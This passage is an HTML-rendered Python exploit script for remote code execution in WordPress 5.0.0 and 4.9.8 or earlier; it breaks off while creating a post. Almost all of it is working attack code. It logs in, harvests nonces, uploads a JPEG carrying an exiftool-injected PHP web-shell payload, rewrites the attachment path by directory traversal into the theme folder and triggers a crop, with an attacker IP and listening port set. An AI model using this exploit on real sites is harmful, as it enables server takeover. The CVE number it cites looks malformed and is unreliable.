<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a><span class=c1># Version: WordPress 5.0.0 and &lt;= 4.9.8 .</span>
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a><span class=c1># References : CVE-2019-89242 | CVE-2019-89242  | https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</span>
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a>
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=c1>#/usr/bin/env python3</span>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a>
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a><span class=kn>import</span> <span class=nn>requests</span>
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a><span class=kn>import</span> <span class=nn>re</span>
<a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a><span class=kn>import</span> <span class=nn>sys</span>
<a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>datetime</span>
<a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a>
<a id=__codelineno-7-15 name=__codelineno-7-15 href=#__codelineno-7-15></a><span class=n>banner</span> <span class=o>=</span> <span class=s2>&quot;&quot;&quot;</span>
<a id=__codelineno-7-16 name=__codelineno-7-16 href=#__codelineno-7-16></a>
<a id=__codelineno-7-17 name=__codelineno-7-17 href=#__codelineno-7-17></a><span class=s2>__        __            _                           ____   ____ _____</span>
<a id=__codelineno-7-18 name=__codelineno-7-18 href=#__codelineno-7-18></a><span class=s2>\ \      / /__  _ __ __| |_ __  _ __ ___  ___ ___  |  _ \ / ___| ____|</span>
<a id=__codelineno-7-19 name=__codelineno-7-19 href=#__codelineno-7-19></a><span class=s2> \ \ /\ / / _ \| &#39;__/ _` | &#39;_ \| &#39;__/ _ \/ __/ __| | |_) | |   |  _|</span>
<a id=__codelineno-7-20 name=__codelineno-7-20 href=#__codelineno-7-20></a><span class=s2>  \ V  V / (_) | | | (_| | |_) | | |  __/\__ \__ \ |  _ &lt;| |___| |___</span>
<a id=__codelineno-7-21 name=__codelineno-7-21 href=#__codelineno-7-21></a><span class=s2>   \_/\_/ \___/|_|  \__,_| .__/|_|  \___||___/___/ |_| \_</span><span class=se>\\</span><span class=s2>____|_____|</span>
<a id=__codelineno-7-22 name=__codelineno-7-22 href=#__codelineno-7-22></a><span class=s2>                         |_|</span>
<a id=__codelineno-7-23 name=__codelineno-7-23 href=#__codelineno-7-23></a><span class=s2>                                                5.0.0 and &lt;= 4.9.8</span>
<a id=__codelineno-7-24 name=__codelineno-7-24 href=#__codelineno-7-24></a><span class=s2>&quot;&quot;&quot;</span>
<a id=__codelineno-7-25 name=__codelineno-7-25 href=#__codelineno-7-25></a><span class=nb>print</span><span class=p>(</span><span class=n>banner</span><span class=p>)</span>
<a id=__codelineno-7-26 name=__codelineno-7-26 href=#__codelineno-7-26></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;usage :&quot;</span><span class=p>)</span>
<a id=__codelineno-7-27 name=__codelineno-7-27 href=#__codelineno-7-27></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;=======&quot;</span><span class=p>)</span>
<a id=__codelineno-7-28 name=__codelineno-7-28 href=#__codelineno-7-28></a><span class=n>usage</span> <span class=o>=</span> <span class=s1>&#39;python3 RCE_wordpress.py http://&lt;IP&gt;:&lt;PORT&gt;/ &lt;Username&gt; &lt;Password&gt; &lt;WordPress_theme&gt;&#39;</span>
<a id=__codelineno-7-29 name=__codelineno-7-29 href=#__codelineno-7-29></a><span class=nb>print</span><span class=p>(</span><span class=n>usage</span><span class=p>)</span>
<a id=__codelineno-7-30 name=__codelineno-7-30 href=#__codelineno-7-30></a>
<a id=__codelineno-7-31 name=__codelineno-7-31 href=#__codelineno-7-31></a><span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
<a id=__codelineno-7-32 name=__codelineno-7-32 href=#__codelineno-7-32></a><span class=n>username</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
<a id=__codelineno-7-33 name=__codelineno-7-33 href=#__codelineno-7-33></a><span class=n>password</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
<a id=__codelineno-7-34 name=__codelineno-7-34 href=#__codelineno-7-34></a><span class=n>wp_theme</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=c1># wpscan results</span>
<a id=__codelineno-7-35 name=__codelineno-7-35 href=#__codelineno-7-35></a>
<a id=__codelineno-7-36 name=__codelineno-7-36 href=#__codelineno-7-36></a><span class=n>lhost</span> <span class=o>=</span> <span class=s1>&#39;10.10.10.10&#39;</span> <span class=c1>#attacker ip</span>
<a id=__codelineno-7-37 name=__codelineno-7-37 href=#__codelineno-7-37></a><span class=n>lport</span> <span class=o>=</span> <span class=s1>&#39;4141&#39;</span> <span class=c1>#listening port</span>
<a id=__codelineno-7-38 name=__codelineno-7-38 href=#__codelineno-7-38></a>
<a id=__codelineno-7-39 name=__codelineno-7-39 href=#__codelineno-7-39></a><span class=n>date</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s1>&#39;%Y&#39;</span><span class=p>))</span><span class=o>+</span><span class=s1>&#39;/&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s1>&#39;%m&#39;</span><span class=p>))</span><span class=o>+</span><span class=s1>&#39;/&#39;</span>
<a id=__codelineno-7-40 name=__codelineno-7-40 href=#__codelineno-7-40></a>
<a id=__codelineno-7-41 name=__codelineno-7-41 href=#__codelineno-7-41></a><span class=n>imagename</span> <span class=o>=</span> <span class=s1>&#39;gd.jpg&#39;</span>
<a id=__codelineno-7-42 name=__codelineno-7-42 href=#__codelineno-7-42></a><span class=c1># ======</span>
<a id=__codelineno-7-43 name=__codelineno-7-43 href=#__codelineno-7-43></a><span class=c1># Note :</span>
<a id=__codelineno-7-44 name=__codelineno-7-44 href=#__codelineno-7-44></a><span class=c1># ======</span>
<a id=__codelineno-7-45 name=__codelineno-7-45 href=#__codelineno-7-45></a><span class=c1># It could be any jpg image, BUT there are some modifications first :</span>
<a id=__codelineno-7-46 name=__codelineno-7-46 href=#__codelineno-7-46></a><span class=c1># 1- image name as : &quot;gd.jpg&quot;</span>
<a id=__codelineno-7-47 name=__codelineno-7-47 href=#__codelineno-7-47></a><span class=c1># 2- place the image in the same directory as this exploit.</span>
<a id=__codelineno-7-48 name=__codelineno-7-48 href=#__codelineno-7-48></a><span class=c1># 3- inject the php payload via exiftool : exiftool gd.jpg -CopyrightNotice=&quot;&lt;?=\`\$_GET[0]\`?&gt;&quot;</span>
<a id=__codelineno-7-49 name=__codelineno-7-49 href=#__codelineno-7-49></a>
<a id=__codelineno-7-50 name=__codelineno-7-50 href=#__codelineno-7-50></a><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-7-51 name=__codelineno-7-51 href=#__codelineno-7-51></a>        <span class=s1>&#39;log&#39;</span><span class=p>:</span><span class=n>username</span><span class=p>,</span>
<a id=__codelineno-7-52 name=__codelineno-7-52 href=#__codelineno-7-52></a>        <span class=s1>&#39;pwd&#39;</span><span class=p>:</span><span class=n>password</span><span class=p>,</span>
<a id=__codelineno-7-53 name=__codelineno-7-53 href=#__codelineno-7-53></a>        <span class=s1>&#39;wp-submit&#39;</span><span class=p>:</span><span class=s1>&#39;Log In&#39;</span><span class=p>,</span>
<a id=__codelineno-7-54 name=__codelineno-7-54 href=#__codelineno-7-54></a>        <span class=s1>&#39;redirect_to&#39;</span><span class=p>:</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/&#39;</span><span class=p>,</span>
<a id=__codelineno-7-55 name=__codelineno-7-55 href=#__codelineno-7-55></a>        <span class=s1>&#39;testcookie&#39;</span><span class=p>:</span><span class=mi>1</span>
<a id=__codelineno-7-56 name=__codelineno-7-56 href=#__codelineno-7-56></a><span class=p>}</span>
<a id=__codelineno-7-57 name=__codelineno-7-57 href=#__codelineno-7-57></a>
<a id=__codelineno-7-58 name=__codelineno-7-58 href=#__codelineno-7-58></a><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-login.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
<a id=__codelineno-7-59 name=__codelineno-7-59 href=#__codelineno-7-59></a>
<a id=__codelineno-7-60 name=__codelineno-7-60 href=#__codelineno-7-60></a><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-61 name=__codelineno-7-61 href=#__codelineno-7-61></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Login successful.</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-62 name=__codelineno-7-62 href=#__codelineno-7-62></a><span class=k>else</span><span class=p>:</span>
<a id=__codelineno-7-63 name=__codelineno-7-63 href=#__codelineno-7-63></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Failed to login.&quot;</span><span class=p>)</span>
<a id=__codelineno-7-64 name=__codelineno-7-64 href=#__codelineno-7-64></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-65 name=__codelineno-7-65 href=#__codelineno-7-65></a>
<a id=__codelineno-7-66 name=__codelineno-7-66 href=#__codelineno-7-66></a><span class=n>cookies</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>cookies</span>
<a id=__codelineno-7-67 name=__codelineno-7-67 href=#__codelineno-7-67></a>
<a id=__codelineno-7-68 name=__codelineno-7-68 href=#__codelineno-7-68></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Getting Wp Nonce ... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-69 name=__codelineno-7-69 href=#__codelineno-7-69></a>
<a id=__codelineno-7-70 name=__codelineno-7-70 href=#__codelineno-7-70></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/media-new.php&#39;</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-71 name=__codelineno-7-71 href=#__codelineno-7-71></a><span class=n>wp_nonce_list</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;name=&quot;_wpnonce&quot; value=&quot;(\w+)&quot;&#39;</span><span class=p>,</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<a id=__codelineno-7-72 name=__codelineno-7-72 href=#__codelineno-7-72></a>
<a id=__codelineno-7-73 name=__codelineno-7-73 href=#__codelineno-7-73></a><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>wp_nonce_list</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=p>:</span>
<a id=__codelineno-7-74 name=__codelineno-7-74 href=#__codelineno-7-74></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Failed to retrieve the _wpnonce </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-75 name=__codelineno-7-75 href=#__codelineno-7-75></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-76 name=__codelineno-7-76 href=#__codelineno-7-76></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-77 name=__codelineno-7-77 href=#__codelineno-7-77></a>        <span class=n>wp_nonce</span> <span class=o>=</span> <span class=n>wp_nonce_list</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-78 name=__codelineno-7-78 href=#__codelineno-7-78></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Wp Nonce retrieved successfully ! _wpnonce : &quot;</span> <span class=o>+</span> <span class=n>wp_nonce</span><span class=o>+</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-79 name=__codelineno-7-79 href=#__codelineno-7-79></a>
<a id=__codelineno-7-80 name=__codelineno-7-80 href=#__codelineno-7-80></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Uploading the image ... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-81 name=__codelineno-7-81 href=#__codelineno-7-81></a>
<a id=__codelineno-7-82 name=__codelineno-7-82 href=#__codelineno-7-82></a><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-7-83 name=__codelineno-7-83 href=#__codelineno-7-83></a>        <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;gd.jpg&#39;</span><span class=p>,</span>
<a id=__codelineno-7-84 name=__codelineno-7-84 href=#__codelineno-7-84></a>        <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;upload-attachment&#39;</span><span class=p>,</span>
<a id=__codelineno-7-85 name=__codelineno-7-85 href=#__codelineno-7-85></a>        <span class=s1>&#39;_wpnonce&#39;</span><span class=p>:</span> <span class=n>wp_nonce</span>
<a id=__codelineno-7-86 name=__codelineno-7-86 href=#__codelineno-7-86></a><span class=p>}</span>
<a id=__codelineno-7-87 name=__codelineno-7-87 href=#__codelineno-7-87></a>
<a id=__codelineno-7-88 name=__codelineno-7-88 href=#__codelineno-7-88></a><span class=n>image</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;async-upload&#39;</span><span class=p>:</span> <span class=p>(</span><span class=n>imagename</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=n>imagename</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>))}</span>
<a id=__codelineno-7-89 name=__codelineno-7-89 href=#__codelineno-7-89></a><span class=n>r_upload</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/async-upload.php&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>image</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-90 name=__codelineno-7-90 href=#__codelineno-7-90></a><span class=k>if</span> <span class=n>r_upload</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-91 name=__codelineno-7-91 href=#__codelineno-7-91></a>        <span class=n>image_id</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;{&quot;id&quot;:(\d+),&#39;</span><span class=p>,</span><span class=n>r_upload</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-92 name=__codelineno-7-92 href=#__codelineno-7-92></a>        <span class=n>_wp_nonce</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;&quot;update&quot;:&quot;(\w+)&quot;&#39;</span><span class=p>,</span><span class=n>r_upload</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-93 name=__codelineno-7-93 href=#__codelineno-7-93></a>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[+] Image uploaded successfully ! Image ID :&#39;</span><span class=o>+</span> <span class=n>image_id</span><span class=o>+</span><span class=s2>&quot;</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-94 name=__codelineno-7-94 href=#__codelineno-7-94></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-95 name=__codelineno-7-95 href=#__codelineno-7-95></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Failed to receive a response for uploaded image ! try again . </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-96 name=__codelineno-7-96 href=#__codelineno-7-96></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-97 name=__codelineno-7-97 href=#__codelineno-7-97></a>
<a id=__codelineno-7-98 name=__codelineno-7-98 href=#__codelineno-7-98></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Changing the path ... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-99 name=__codelineno-7-99 href=#__codelineno-7-99></a>
<a id=__codelineno-7-100 name=__codelineno-7-100 href=#__codelineno-7-100></a>
<a id=__codelineno-7-101 name=__codelineno-7-101 href=#__codelineno-7-101></a><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-7-102 name=__codelineno-7-102 href=#__codelineno-7-102></a>        <span class=s1>&#39;_wpnonce&#39;</span><span class=p>:</span><span class=n>_wp_nonce</span><span class=p>,</span>
<a id=__codelineno-7-103 name=__codelineno-7-103 href=#__codelineno-7-103></a>        <span class=s1>&#39;action&#39;</span><span class=p>:</span><span class=s1>&#39;editpost&#39;</span><span class=p>,</span>
<a id=__codelineno-7-104 name=__codelineno-7-104 href=#__codelineno-7-104></a>        <span class=s1>&#39;post_ID&#39;</span><span class=p>:</span><span class=n>image_id</span><span class=p>,</span>
<a id=__codelineno-7-105 name=__codelineno-7-105 href=#__codelineno-7-105></a>        <span class=s1>&#39;meta_input[_wp_attached_file]&#39;</span><span class=p>:</span><span class=n>date</span><span class=o>+</span><span class=n>imagename</span><span class=o>+</span><span class=s1>&#39;?/../../../../themes/&#39;</span><span class=o>+</span><span class=n>wp_theme</span><span class=o>+</span><span class=s1>&#39;/rahali&#39;</span>
<a id=__codelineno-7-106 name=__codelineno-7-106 href=#__codelineno-7-106></a><span class=p>}</span>
<a id=__codelineno-7-107 name=__codelineno-7-107 href=#__codelineno-7-107></a>
<a id=__codelineno-7-108 name=__codelineno-7-108 href=#__codelineno-7-108></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/post.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-109 name=__codelineno-7-109 href=#__codelineno-7-109></a><span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-110 name=__codelineno-7-110 href=#__codelineno-7-110></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Path has been changed successfully. </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-111 name=__codelineno-7-111 href=#__codelineno-7-111></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-112 name=__codelineno-7-112 href=#__codelineno-7-112></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Failed to change the path ! Make sure the theme is correcte .</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-113 name=__codelineno-7-113 href=#__codelineno-7-113></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-114 name=__codelineno-7-114 href=#__codelineno-7-114></a>
<a id=__codelineno-7-115 name=__codelineno-7-115 href=#__codelineno-7-115></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Getting Ajax nonce ... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-116 name=__codelineno-7-116 href=#__codelineno-7-116></a>
<a id=__codelineno-7-117 name=__codelineno-7-117 href=#__codelineno-7-117></a><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-7-118 name=__codelineno-7-118 href=#__codelineno-7-118></a>        <span class=s1>&#39;action&#39;</span><span class=p>:</span><span class=s1>&#39;query-attachments&#39;</span><span class=p>,</span>
<a id=__codelineno-7-119 name=__codelineno-7-119 href=#__codelineno-7-119></a>        <span class=s1>&#39;post_id&#39;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
<a id=__codelineno-7-120 name=__codelineno-7-120 href=#__codelineno-7-120></a>        <span class=s1>&#39;query[item]&#39;</span><span class=p>:</span><span class=mi>43</span><span class=p>,</span>
<a id=__codelineno-7-121 name=__codelineno-7-121 href=#__codelineno-7-121></a>        <span class=s1>&#39;query[orderby]&#39;</span><span class=p>:</span><span class=s1>&#39;date&#39;</span><span class=p>,</span>
<a id=__codelineno-7-122 name=__codelineno-7-122 href=#__codelineno-7-122></a>        <span class=s1>&#39;query[order]&#39;</span><span class=p>:</span><span class=s1>&#39;DESC&#39;</span><span class=p>,</span>
<a id=__codelineno-7-123 name=__codelineno-7-123 href=#__codelineno-7-123></a>        <span class=s1>&#39;query[posts_per_page]&#39;</span><span class=p>:</span><span class=mi>40</span><span class=p>,</span>
<a id=__codelineno-7-124 name=__codelineno-7-124 href=#__codelineno-7-124></a>        <span class=s1>&#39;query[paged]&#39;</span><span class=p>:</span><span class=mi>1</span>
<a id=__codelineno-7-125 name=__codelineno-7-125 href=#__codelineno-7-125></a><span class=p>}</span>
<a id=__codelineno-7-126 name=__codelineno-7-126 href=#__codelineno-7-126></a>
<a id=__codelineno-7-127 name=__codelineno-7-127 href=#__codelineno-7-127></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/admin-ajax.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-128 name=__codelineno-7-128 href=#__codelineno-7-128></a><span class=n>ajax_nonce_list</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;,&quot;edit&quot;:&quot;(\w+)&quot;&#39;</span><span class=p>,</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<a id=__codelineno-7-129 name=__codelineno-7-129 href=#__codelineno-7-129></a>
<a id=__codelineno-7-130 name=__codelineno-7-130 href=#__codelineno-7-130></a><span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=nb>len</span><span class=p>(</span><span class=n>ajax_nonce_list</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>:</span>
<a id=__codelineno-7-131 name=__codelineno-7-131 href=#__codelineno-7-131></a>        <span class=n>ajax_nonce</span> <span class=o>=</span> <span class=n>ajax_nonce_list</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-132 name=__codelineno-7-132 href=#__codelineno-7-132></a>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[+] Ajax Nonce retrieved successfully ! ajax_nonce : &#39;</span><span class=o>+</span> <span class=n>ajax_nonce</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<a id=__codelineno-7-133 name=__codelineno-7-133 href=#__codelineno-7-133></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-134 name=__codelineno-7-134 href=#__codelineno-7-134></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Failed to retrieve ajax_nonce.</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-135 name=__codelineno-7-135 href=#__codelineno-7-135></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-136 name=__codelineno-7-136 href=#__codelineno-7-136></a>
<a id=__codelineno-7-137 name=__codelineno-7-137 href=#__codelineno-7-137></a>
<a id=__codelineno-7-138 name=__codelineno-7-138 href=#__codelineno-7-138></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Cropping the uploaded image ... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-139 name=__codelineno-7-139 href=#__codelineno-7-139></a>
<a id=__codelineno-7-140 name=__codelineno-7-140 href=#__codelineno-7-140></a><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
<a id=__codelineno-7-141 name=__codelineno-7-141 href=#__codelineno-7-141></a>        <span class=s1>&#39;action&#39;</span><span class=p>:</span><span class=s1>&#39;crop-image&#39;</span><span class=p>,</span>
<a id=__codelineno-7-142 name=__codelineno-7-142 href=#__codelineno-7-142></a>        <span class=s1>&#39;_ajax_nonce&#39;</span><span class=p>:</span><span class=n>ajax_nonce</span><span class=p>,</span>
<a id=__codelineno-7-143 name=__codelineno-7-143 href=#__codelineno-7-143></a>        <span class=s1>&#39;id&#39;</span><span class=p>:</span><span class=n>image_id</span><span class=p>,</span>
<a id=__codelineno-7-144 name=__codelineno-7-144 href=#__codelineno-7-144></a>        <span class=s1>&#39;cropDetails[x1]&#39;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
<a id=__codelineno-7-145 name=__codelineno-7-145 href=#__codelineno-7-145></a>        <span class=s1>&#39;cropDetails[y1]&#39;</span><span class=p>:</span><span class=mi>0</span><span class=p>,</span>
<a id=__codelineno-7-146 name=__codelineno-7-146 href=#__codelineno-7-146></a>        <span class=s1>&#39;cropDetails[width]&#39;</span><span class=p>:</span><span class=mi>200</span><span class=p>,</span>
<a id=__codelineno-7-147 name=__codelineno-7-147 href=#__codelineno-7-147></a>        <span class=s1>&#39;cropDetails[height]&#39;</span><span class=p>:</span><span class=mi>100</span><span class=p>,</span>
<a id=__codelineno-7-148 name=__codelineno-7-148 href=#__codelineno-7-148></a>        <span class=s1>&#39;cropDetails[dst_width]&#39;</span><span class=p>:</span><span class=mi>200</span><span class=p>,</span>
<a id=__codelineno-7-149 name=__codelineno-7-149 href=#__codelineno-7-149></a>        <span class=s1>&#39;cropDetails[dst_height]&#39;</span><span class=p>:</span><span class=mi>100</span>
<a id=__codelineno-7-150 name=__codelineno-7-150 href=#__codelineno-7-150></a><span class=p>}</span>
<a id=__codelineno-7-151 name=__codelineno-7-151 href=#__codelineno-7-151></a>
<a id=__codelineno-7-152 name=__codelineno-7-152 href=#__codelineno-7-152></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/admin-ajax.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-153 name=__codelineno-7-153 href=#__codelineno-7-153></a><span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-154 name=__codelineno-7-154 href=#__codelineno-7-154></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Done . </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-155 name=__codelineno-7-155 href=#__codelineno-7-155></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-156 name=__codelineno-7-156 href=#__codelineno-7-156></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Erorr ! Try again </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-157 name=__codelineno-7-157 href=#__codelineno-7-157></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-158 name=__codelineno-7-158 href=#__codelineno-7-158></a>
<a id=__codelineno-7-159 name=__codelineno-7-159 href=#__codelineno-7-159></a><span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Creating a new post to include the image... &quot;</span><span class=p>)</span>
<a id=__codelineno-7-160 name=__codelineno-7-160 href=#__codelineno-7-160></a>
<a id=__codelineno-7-161 name=__codelineno-7-161 href=#__codelineno-7-161></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/post-new.php&#39;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
